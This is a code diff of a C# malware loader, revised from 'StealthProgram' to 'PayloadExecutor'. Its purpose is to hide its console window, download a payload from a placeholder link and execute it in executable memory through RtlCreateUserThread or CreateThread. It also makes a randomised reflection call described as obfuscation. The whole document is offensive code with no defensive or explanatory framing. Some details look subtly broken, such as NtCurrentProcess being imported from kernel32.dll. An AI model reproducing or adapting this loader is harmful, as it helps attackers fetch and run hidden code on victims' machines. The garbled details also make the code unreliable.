@@ -1,57 +1,69 @@
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Reflection;
+using System.Diagnostics;
 
-class StealthProgram
+class PayloadExecutor
 {
     static void Main(string[] args)
     {
-
-        IntPtr handle = GetConsoleWindow();
+        // Hide the console window
+        var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        byte[] shellcode = DownloadPayload("[DOWNLOAD_LINK]");
+        // Download the payload
+        byte[] payload = DownloadPayload("[DOWNLOAD_LINK]");
 
-        IntPtr memoryAddress = AllocateMemory(shellcode.Length);
-        Marshal.Copy(shellcode, 0, memoryAddress, shellcode.Length);
+        // Allocate memory for the payload
+        IntPtr memoryAddress = AllocateMemory(payload.Length);
+        Marshal.Copy(payload, 0, memoryAddress, payload.Length);
 
+        // Execute the payload
+        ExecutePayload(memoryAddress);
 
-        IntPtr threadHandle = ExecutePayload(memoryAddress);
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
-
-        
+        // Call a random method to further obfuscate the execution flow
         ObfuscateExecutionFlow();
     }
 
     static byte[] DownloadPayload(string url)
     {
-        using (WebClient webClient = new WebClient())
+        using (WebClient wc = new WebClient())
         {
-            return webClient.DownloadData(url);
+            return wc.DownloadData(url);
         }
     }
 
     static IntPtr AllocateMemory(int size)
     {
-        IntPtr kernel32 = LoadLibrary("kernel32.dll");
-        IntPtr virtualAllocAddress = GetProcAddress(kernel32, "VirtualAlloc");
-        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddress, typeof(VirtualAllocDelegate));
-        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        return VirtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
     }
 
-    static IntPtr ExecutePayload(IntPtr memoryAddress)
+    static void ExecutePayload(IntPtr memoryAddress)
     {
-        IntPtr createThreadAddress = GetProcAddress(LoadLibrary("kernel32.dll"), "CreateThread");
-        CreateThreadDelegate createThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(createThreadAddress, typeof(CreateThreadDelegate));
-        return createThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
+        uint oldProtect;
+        VirtualProtect(memoryAddress, (UIntPtr)4096, 0x40, out oldProtect);
+
+        IntPtr threadHandle = IntPtr.Zero;
+        IntPtr parameter = IntPtr.Zero;
+
+        bool bSuccess = false;
+        RtlCreateUserThread(NtCurrentProcess(), IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memoryAddress, parameter, out threadHandle, IntPtr.Zero);
+        if (threadHandle != IntPtr.Zero)
+        {
+            bSuccess = true;
+        }
+
+        if (!bSuccess)
+        {
+            CreateThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
+        }
     }
 
     static void ObfuscateExecutionFlow()
     {
-        MethodInfo[] methods = typeof(ObfuscationActions).GetMethods(BindingFlags.Public | BindingFlags.Static);
-        Random random = new Random();
-        int index = random.Next(methods.Length);
+        var methods = typeof(ObfuscationActions).GetMethods(System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
+        Random rand = new Random();
+        int index = rand.Next(methods.Length);
         methods[index].Invoke(null, null);
     }
 
@@ -63,18 +75,23 @@ class StealthProgram
 
     private const int SW_HIDE = 0;
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr LoadLibrary(string dllName);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
     [DllImport("kernel32.dll")]
-    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr NtCurrentProcess();
 
-    private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+    private static extern int RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurity, bool CreateSuspended, uint StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr StartParameter, out IntPtr Thread, IntPtr ClientId);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
     [Flags]
     enum AllocationType
